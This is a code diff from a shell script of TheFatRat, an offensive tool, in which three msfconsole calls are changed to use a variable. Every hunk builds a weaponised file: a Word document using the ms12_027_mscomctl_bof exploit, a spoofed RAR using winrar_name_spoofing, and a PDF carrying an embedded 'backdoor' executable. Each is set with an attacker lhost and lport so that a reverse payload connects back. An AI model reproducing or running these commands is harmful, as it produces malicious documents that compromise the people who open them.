@@ -685,7 +685,7 @@ echo ""
 					gboor
 					spinlong
 					echo ""
-         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "msfconsole -x 'use exploit/windows/fileformat/ms12_027_mscomctl_bof; set payload $payloads ; set FILENAME $fira.doc; set lhost $yourip ; set lport $yourport; exploit; exit -y'" > /dev/null 2>&1
+         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/ms12_027_mscomctl_bof; set payload $payloads ; set FILENAME $fira.doc; set lhost $yourip ; set lport $yourport; exploit; exit -y'" > /dev/null 2>&1
          				echo ""
          				mv ~/.msf4/local/$fira.doc $path/output/$fira.doc
          				echo -e $okegreen""
@@ -718,7 +718,7 @@ echo ""
   					gboor
   					spinlong
   					echo ""
-           				 xterm -T " TheFatRat < RAR BUILDER > " -geometry 110x23 -e "msfconsole -x 'use exploit/windows/fileformat/winrar_name_spoofing; set payload $payloads; set FILENAME $fira; set SPOOF $fira2; set lhost $yourip; set lport $yourport; exploit; exit -y'" > /dev/null 2>&1
+           				 xterm -T " TheFatRat < RAR BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/winrar_name_spoofing; set payload $payloads; set FILENAME $fira; set SPOOF $fira2; set lhost $yourip; set lport $yourport; exploit; exit -y'" > /dev/null 2>&1
            				 echo ""
            				 mv ~/.msf4/local/$fira $path/output/$fira
            				 echo -e $okegreen""
@@ -1149,7 +1149,7 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					$COMPILER -Wall -mwindows icons/icon.res $pdfcom -o "$path/output/backdoor_for_pdf.exe" > /dev/null 2>&1
 					sleep 2
 					echo " Wait for embed exe to pdf ....  "
-					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $path/output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
+					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $path/output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
 					echo ""
 					mv ~/.msf4/local/$fira.pdf $path/output/$fira.pdf
 					rm unicorn.rc powershell_attack.txt
